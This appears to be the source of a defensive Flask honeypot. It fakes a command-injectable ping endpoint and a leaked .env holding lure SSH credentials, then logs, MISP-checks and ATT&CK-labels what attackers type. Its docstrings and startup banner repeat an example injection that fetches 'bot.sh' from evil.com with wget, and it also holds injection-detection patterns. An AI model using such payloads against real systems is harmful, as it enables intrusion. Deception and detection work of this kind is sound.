#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
ADAPTIVE HONEYPOT - WEB DECOY & COMMAND INJECTION (RCE) LURE ENGINE
=============================================================================
Đóng vai trò là Web Application (Lớp 7) hướng ra Internet.
Khi hacker khai thác lỗ hổng Web:
  1. Lộ file cấu hình (.env, config.php, .git/config) -> Lộ mật khẩu SSH.
  2. RCE / Command Injection qua endpoint (/api/ping?host=127.0.0.1;whoami;uname -a;wget ...)
Trích xuất toàn bộ chuỗi lệnh shell, lưu log chưa gán nhãn chuẩn parquet,
đối soát tức thì với cơ sở dữ liệu MISP IoC, và gán nhãn MITRE ATT&CK.
Đồng thời trả về kết quả Linux mô phỏng chân thực và mồi nhử hacker nhảy vào cổng SSH Honeypot (2222).
"""

import os
import re
import sys
import json
import time
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
from flask import Flask, request, jsonify, Response, render_template_string

# Đảm bảo đường dẫn import thư viện nội bộ
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from config import WEB_HOST, WEB_PORT, SSH_PORT, LOGS_DIR, HONEYPOT_ALLOWED_PASSWORDS
from threat_intel.logger import HoneypotLogger, UNLABELED_SESSIONS_FILE
from threat_intel.misp_comparator import misp_comparator
from threat_intel.mitre_mapper import MitreMapper

app = Flask(__name__)
logger = HoneypotLogger()

# Mật khẩu gợi ý mồi nhử trong file cấu hình rò rỉ
LURE_PASSWORD = HONEYPOT_ALLOWED_PASSWORDS[-1] if HONEYPOT_ALLOWED_PASSWORDS else "supersecretpassword123"

# =============================================================================
# BỘ TÁCH & PHÂN TÍCH LỆNH COMMAND INJECTION (RCE)
# =============================================================================
CMD_SEPARATORS_REGEX = re.compile(r'(?:;|&&|\|\||\||`|\$\([^)]+\))')

def extract_injected_commands(raw_param: str) -> list:
    """
    Trích xuất các lệnh Linux từ chuỗi Command Injection của hacker.
    Ví dụ: '127.0.0.1;whoami;uname -a;wget http://evil.com/bot.sh'
    -> ['whoami', 'uname -a', 'wget http://evil.com/bot.sh']
    """
    if not raw_param:
        return []
    
    # URL decode chuỗi
    decoded = urllib.parse.unquote_plus(raw_param).strip()
    
    # Loại bỏ cú pháp backtick hoặc $()
    clean_text = decoded
    backticks = re.findall(r'`([^`]+)`', decoded)
    subshells = re.findall(r'\$\(([^)]+)\)', decoded)
    for b in backticks + subshells:
        clean_text = clean_text.replace(f"`{b}`", f"; {b} ;").replace(f"$({b})", f"; {b} ;")

    # Tách theo các ký tự nối lệnh Linux (; && || |)
    tokens = re.split(r';|&&|\|\||\|', clean_text)
    commands = []
    
    for t in tokens:
        cmd = t.strip()
        # Bỏ qua địa chỉ IP đầu tiên nếu là tham số hợp lệ của ping
        if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', cmd) or cmd in ("127.0.0.1", "localhost", "8.8.8.8"):
            continue
        # Bỏ qua token rỗng
        if not cmd:
            continue
        commands.append(cmd)
        
    return commands


def simulate_command_execution(cmd: str) -> str:
    """
    Mô phỏng kết quả trả về của các lệnh Linux cơ bản khi hacker RCE.
    Làm hacker tin rằng mình đã thực thi được mã trên server Ubuntu thật.
    """
    cmd_lower = cmd.lower().strip()
    
    if cmd_lower in ("whoami",):
        return "www-data\n"
    if cmd_lower in ("id",):
        return "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
    if "uname" in cmd_lower:
        return "Linux cloud-corp-gateway 5.15.0-89-generic #99-Ubuntu SMP Fri Nov 3 14:00:00 UTC 2026 x86_64 x86_64 GNU/Linux\n"
    if "cat /etc/passwd" in cmd_lower:
        return (
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "ubuntu:x:1000:1000:Ubuntu User,,,:/home/ubuntu:/bin/bash\n"
        )
    if "cat /proc/mounts" in cmd_lower:
        return (
            "/dev/sda1 / ext4 rw,relatime 0 0\n"
            "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
            "sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0\n"
            "tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0\n"
        )
    if "netstat" in cmd_lower or "ss -t" in cmd_lower:
        return (
            "Active Internet connections (only servers)\n"
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State      \n"
            f"tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     \n"
            f"tcp        0      0 0.0.0.0:{SSH_PORT}            0.0.0.0:*               LISTEN     \n"
            "tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     \n"
        )
    if "cat .env" in cmd_lower or "cat /var/www/.env" in cmd_lower:
        return (
            "# Production Environment Configuration\n"
            "APP_ENV=production\n"
            "DB_HOST=127.0.0.1\n"
            f"SSH_INTERNAL_PORT={SSH_PORT}\n"
            "SSH_USER=ubuntu\n"
            f"SSH_PASSWORD={LURE_PASSWORD}\n"
        )
    if cmd_lower.startswith("wget ") or cmd_lower.startswith("curl "):
        url_match = re.search(r'https?://\S+', cmd)
        url = url_match.group(0) if url_match else "http://malware.xyz/bot.sh"
        filename = url.split("/")[-1] or "downloaded_file"
        return (
            f"--2026-11-14 13:07:00--  {url}\n"
            f"Resolving evil.server (evil.server)... 185.220.101.5\n"
            f"Connecting to evil.server (evil.server)|185.220.101.5|:80... connected.\n"
            f"HTTP request sent, awaiting response... 200 OK\n"
            f"Length: 4210 (4.1K) [text/x-sh]\n"
            f"Saving to: '{filename}'\n\n"
            f"{filename}          100%[===================>]   4.11K  --.-KB/s    in 0.001s\n\n"
            f"2026-11-14 13:07:00 (4.11 MB/s) - '{filename}' saved [4210/4210]\n"
        )
    if cmd_lower.startswith("chmod "):
        return ""
    if cmd_lower.startswith("rm "):
        return ""
    if "./" in cmd_lower or cmd_lower.startswith("sh "):
        return "[+] Process executed in background (PID 4821)\n"
    if "ls" in cmd_lower:
        return "app.py  config.php  dist  index.html  package.json  static  uploads  .env\n"
    if "pwd" in cmd_lower:
        return "/var/www/html\n"
    
    return f"{cmd.split()[0]}: command executed.\n"


def process_rce_payload(client_ip: str, client_port: int, raw_payload: str, endpoint: str) -> dict:
    """
    Xử lý payload RCE: Trích xuất lệnh, format chuỗi full_session chuẩn train parquet,
    gán nhãn MITRE, lưu unlabeled_sessions.jsonl, và đối soát MISP IoC.
    """
    commands = extract_injected_commands(raw_payload)
    if not commands:
        commands = [raw_payload.strip()]

    # Ghép chuỗi full_session đúng định dạng file train parquet: "whoami ; uname -a ; wget http://... ;"
    full_session = " ; ".join(commands) + " ;"

    now_dt = datetime.now(timezone.utc)
    now_iso = now_dt.isoformat()
    now_str = now_dt.strftime("%Y-%m-%d %H:%M:%S")
    session_id = f"web-rce-{int(time.time())}-{client_ip.replace('.', '_')}"

    # 1. Bản ghi log CHƯA GÁN NHÃN (chuẩn ssh_attacks.parquet dành cho AI Máy 2)
    unlabeled_record = {
        "session_id": session_id,
        "attacker_ip": client_ip,
        "attacker_port": client_port,
        "timestamp": now_iso,
        "first_timestamp": now_str,
        "auth": {
            "username": "www-data",
            "password": "N/A (Web RCE / Command Injection)"
        },
        "commands": commands,
        "full_session": full_session,
        "source": "WEB_L7_RCE",
        "endpoint": endpoint
    }

    # Ghi vào logs/unlabeled_sessions.jsonl
    try:
        with open(UNLABELED_SESSIONS_FILE, "a", encoding="utf-8") as uf:
            uf.write(json.dumps(unlabeled_record, ensure_ascii=False) + "\n")
    except Exception as e:
        print(f"[!] Lỗi ghi unlabeled_sessions.jsonl: {e}")

    # 2. Đối soát IoC tức thì với cơ sở dữ liệu MISP
    misp_result = None
    try:
        misp_result = misp_comparator.compare_session(unlabeled_record)
    except Exception as e:
        print(f"[!] Lỗi đối soát MISP: {e}")

    # 3. Gán nhãn sự kiện MITRE ATT&CK cho SOC Dashboard
    # Initial Access: T1190 Exploit Public-Facing Application
    # Execution: T1059.004 Unix Shell Command Injection
    for cmd in commands:
        mitre_block = MitreMapper.map_command(cmd)
        tactic = mitre_block.get("tactic_name", "Execution")
        tech_id = mitre_block.get("technique_id", "T1059.004")
        tech_name = mitre_block.get("technique_name", "Unix Shell")
        event_record = {
            "timestamp": now_iso,
            "source_ip": client_ip,
            "source_port": client_port,
            "protocol": "HTTP_RCE",
            "session_id": session_id,
            "username": "www-data",
            "event_status": "Command_Executed",
            "message": f"Web RCE Injection [{endpoint}] -> {cmd}",
            "command": cmd,
            "command_output": simulate_command_execution(cmd),
            "handler_type": "WEB_COMMAND_INJECTION",
            "latency_ms": 2.1,
            "mitre_tactic": tactic,
            "mitre_technique_id": tech_id,
            "mitre_technique_name": tech_name,
            "severity": "Critical" if "wget" in cmd or "curl" in cmd or "rm" in cmd else "High",
            "misp_matches": misp_result.get("matched_iocs", []) if misp_result else []
        }
        logger._write_event(event_record)

    # 4. Tạo session tổng hợp trong logs/sessions.json
    export_sess = {
        "session_id": session_id,
        "attacker_ip": client_ip,
        "attacker_port": client_port,
        "timestamp": now_iso,
        "first_timestamp": now_str,
        "auth": {
            "username": "www-data",
            "password": "N/A (Web RCE)"
        },
        "commands": commands,
        "full_session": full_session,
        "source_ip": client_ip,
        "source_port": client_port,
        "username": "www-data",
        "passwords_tried": ["N/A (Web RCE)"],
        "start_time": now_iso,
        "end_time": now_iso,
        "duration_seconds": 1,
        "command_count": len(commands),
        "status": "Closed",
        "misp_intel": misp_result,
        "attack_vector": "Layer 7 Web RCE -> Pivot to SSH"
    }

    try:
        sess_file = LOGS_DIR / "sessions.json"
        all_s = []
        if sess_file.exists():
            with open(sess_file, "r", encoding="utf-8") as f:
                all_s = json.load(f)
        all_s.insert(0, export_sess)
        with open(sess_file, "w", encoding="utf-8") as f:
            json.dump(all_s[:100], f, indent=2, ensure_ascii=False)
    except Exception:
        pass

    print(f"\n🔥 [WEB RCE DETECTED] IP: {client_ip}:{client_port}")
    print(f"👉 Injected Commands ({len(commands)}): {commands}")
    print(f"👉 Parquet full_session: {full_session}")
    if misp_result and misp_result.get("match_count", 0) > 0:
        print(f"🚨 [MISP MATCH]: Phát hiện {misp_result['match_count']} IoC độc hại trùng khớp!")

    return {
        "session_id": session_id,
        "commands": commands,
        "full_session": full_session,
        "misp_result": misp_result
    }


# =============================================================================
# CÁC ROUTE CỦA WEB DECOY HONEYPOT
# =============================================================================

@app.route("/")
def index():
    """Trang chủ cổng dịch vụ nội bộ công ty (Mồi nhử Web Portal)"""
    client_ip = request.remote_addr or "127.0.0.1"
    logger._write_event({
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": client_ip,
        "source_port": request.environ.get("REMOTE_PORT", 80),
        "protocol": "HTTP",
        "session_id": f"web-recon-{client_ip.replace('.', '_')}",
        "username": "guest",
        "event_status": "Reconnaissance",
        "message": f"Web Recon: Truy cập trang chủ {request.path}",
        "command": f"GET {request.path}",
        "handler_type": "WEB_DECOY",
        "mitre_tactic": "Discovery",
        "mitre_technique_id": "T1046",
        "mitre_technique_name": "Network Service Discovery",
        "severity": "Low"
    })
    
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Enterprise Cloud Infrastructure Portal</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        body {{ background-color: #0f172a; color: #e2e8f0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; }}
        .badge-status {{ background-color: #10b981; color: white; padding: 4px 8px; border-radius: 4px; }}
      </style>
    </head>
    <body class="py-5">
      <div class="container" style="max-width: 900px;">
        <div class="d-flex justify-content-between align-items-center mb-4 pb-3 border-bottom border-secondary">
          <div>
            <h3 class="mb-0 text-primary">☁️ Cloud Gateway & Diagnostics System</h3>
            <small class="text-secondary">Host: prod-srv-01 | Internal Network Operations</small>
          </div>
          <span class="badge-status">System Online</span>
        </div>

        <div class="row g-4">
          <div class="col-md-6">
            <div class="card p-4 h-100">
              <h5 class="text-info mb-3">🛠️ Network Diagnostic Tool</h5>
              <p class="text-secondary small">Perform latency verification and ICMP reachability checks.</p>
              <form action="/api/ping" method="GET">
                <div class="mb-3">
                  <label class="form-label small text-secondary">Target Host / IP Address:</label>
                  <input type="text" name="host" class="form-control bg-dark text-light border-secondary" placeholder="127.0.0.1" value="127.0.0.1">
                </div>
                <button type="submit" class="btn btn-primary w-100">Run Diagnostics (Ping)</button>
              </form>
            </div>
          </div>

          <div class="col-md-6">
            <div class="card p-4 h-100">
              <h5 class="text-warning mb-3">🔒 Infrastructure Services</h5>
              <ul class="list-unstyled small text-secondary mb-3">
                <li class="py-1">✅ HTTP Web Gateway (Port 80)</li>
                <li class="py-1">✅ PostgreSQL Data Cluster (Port 5432)</li>
                <li class="py-1">🔒 SSH Management Gateway (Port {SSH_PORT}) [Restricted Access]</li>
              </ul>
              <div class="alert alert-dark border-secondary p-2 small text-muted">
                Notice: External SSH direct access is disabled. For maintenance, authenticate via internal bastion credentials.
              </div>
            </div>
          </div>
        </div>
      </div>
    </body>
    </html>
    """
    return render_template_string(html)


@app.route("/robots.txt")
def robots():
    """Mồi nhử hacker vào các file nhạy cảm"""
    return Response(
        "User-agent: *\nDisallow: /.env\nDisallow: /admin\nDisallow: /config.php\nDisallow: /api/ping\nDisallow: /backup/\n",
        mimetype="text/plain"
    )


@app.route("/.env")
@app.route("/config.php")
@app.route("/.git/config")
@app.route("/api/internal/config")
def sensitive_leak():
    """
    LỖ HỔNG LỘ FILE CẤU HÌNH (Credential Access - T1552.001)
    Hacker quét được file .env sẽ thấy tài khoản & mật khẩu SSH.
    Từ đó chúng dùng tài khoản này để SSH vào cổng 2222 (Bẫy Honeypot)!
    """
    client_ip = request.remote_addr or "127.0.0.1"
    client_port = request.environ.get("REMOTE_PORT", 80)
    
    now_iso = datetime.now(timezone.utc).isoformat()
    logger._write_event({
        "timestamp": now_iso,
        "source_ip": client_ip,
        "source_port": client_port,
        "protocol": "HTTP",
        "session_id": f"web-leak-{client_ip.replace('.', '_')}",
        "username": "attacker",
        "event_status": "Credential_Harvesting",
        "message": f"Khai thác lộ file nhạy cảm {request.path} để lấy SSH credentials!",
        "command": f"GET {request.path}",
        "handler_type": "WEB_SENSITIVE_LEAK",
        "mitre_tactic": "Credential Access",
        "mitre_technique_id": "T1552.001",
        "mitre_technique_name": "Credentials in Files: Configuration Files",
        "severity": "Critical"
    })
    
    print(f"\n🚨 [LEAK EXPLOIT] IP: {client_ip} vừa trích xuất file {request.path} để lấy tài khoản SSH!")

    leak_content = f"""# =========================================================
# PRODUCTION INFRASTRUCTURE CONFIGURATION - CONFIDENTIAL
# =========================================================
APP_NAME=Enterprise-Cloud-Gateway
APP_ENV=production
APP_KEY=base64:Xk8m9Qz21L4v8N3bP9q0Ws7dF6hJ2kL4=
APP_DEBUG=false

# Database Configuration
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=cloud_prod
DB_USERNAME=postgres
DB_PASSWORD=SuperSecurePostgres2026!

# Internal Maintenance & Bastion SSH (Pivoting Jump Host)
# Note: Connect via internal gateway on port {SSH_PORT}
SSH_INTERNAL_HOST=127.0.0.1
SSH_INTERNAL_PORT={SSH_PORT}
SSH_MAINTENANCE_USER=ubuntu
SSH_MAINTENANCE_PASS={LURE_PASSWORD}
"""
    return Response(leak_content, mimetype="text/plain")


@app.route("/api/ping", methods=["GET", "POST"])
@app.route("/ping", methods=["GET", "POST"])
@app.route("/diagnostics", methods=["GET", "POST"])
@app.route("/api/tools/ping", methods=["GET", "POST"])
def vulnerable_ping_rce():
    """
    LỖ HỔNG COMMAND INJECTION (RCE) (T1190 & T1059.004)
    Hacker gửi request ví dụ:
      GET /api/ping?host=127.0.0.1;whoami;uname -a;wget http://evil.com/bot.sh
    Hệ thống trích xuất chuỗi lệnh (whoami; uname -a; wget...),
    gán nhãn, ném vào AI Máy 2, đối soát MISP, và trả về output Linux mô phỏng!
    """
    client_ip = request.remote_addr or "127.0.0.1"
    client_port = int(request.environ.get("REMOTE_PORT", 80))

    # Lấy tham số từ GET query string hoặc POST form/json
    target = (
        request.args.get("host") or 
        request.args.get("ip") or 
        request.args.get("cmd") or 
        request.args.get("target") or 
        (request.form.get("host") if request.form else None) or 
        (request.json.get("host") if request.is_json and request.json else None) or 
        "127.0.0.1"
    )

    # Kiểm tra xem có dấu hiệu Command Injection (;, &&, ||, |, `, $()) hay không
    has_injection = any(sep in target for sep in [";", "&&", "||", "|", "`", "$("]) or request.args.get("cmd") is not None

    if has_injection:
        # Xử lý RCE: Trích xuất lệnh, lưu unlabeled_sessions, đối soát MISP
        rce_res = process_rce_payload(client_ip, client_port, target, request.path)
        
        # Tạo output phản hồi mô phỏng chân thực cho hacker
        output_lines = [
            f"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.",
            f"64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms",
            f"--- 127.0.0.1 ping statistics ---",
            f"1 packets transmitted, 1 received, 0% packet loss\n"
        ]
        
        for c in rce_res["commands"]:
            cmd_out = simulate_command_execution(c)
            if cmd_out:
                output_lines.append(cmd_out)

        final_response = "\n".join(output_lines)
        return Response(final_response, mimetype="text/plain")
    else:
        # Ping thông thường hợp lệ
        res = (
            f"PING {target} ({target}) 56(84) bytes of data.\n"
            f"64 bytes from {target}: icmp_seq=1 ttl=64 time=0.042 ms\n"
            f"64 bytes from {target}: icmp_seq=2 ttl=64 time=0.039 ms\n"
            f"\n--- {target} ping statistics ---\n"
            f"2 packets transmitted, 2 received, 0% packet loss\n"
        )
        return Response(res, mimetype="text/plain")


if __name__ == "__main__":
    print("=" * 70)
    print("🌐 [WEB DECOY HONEYPOT] ĐANG KHỞI CHẠY (LỚP 7)...")
    print(f"[*] Lắng nghe tại: http://{WEB_HOST}:{WEB_PORT}")
    print(f"[*] Lỗ hổng mồi nhử:")
    print(f"    - Sensitive File Leak: /.env, /config.php (Chứa SSH credentials)")
    print(f"    - Command Injection (RCE): /api/ping?host=127.0.0.1;whoami;uname -a;wget ...")
    print(f"    - Tự động trích xuất lệnh -> Log thô full_session cho AI & Đối soát MISP")
    print("=" * 70)
    app.run(host=WEB_HOST, port=WEB_PORT, debug=False)
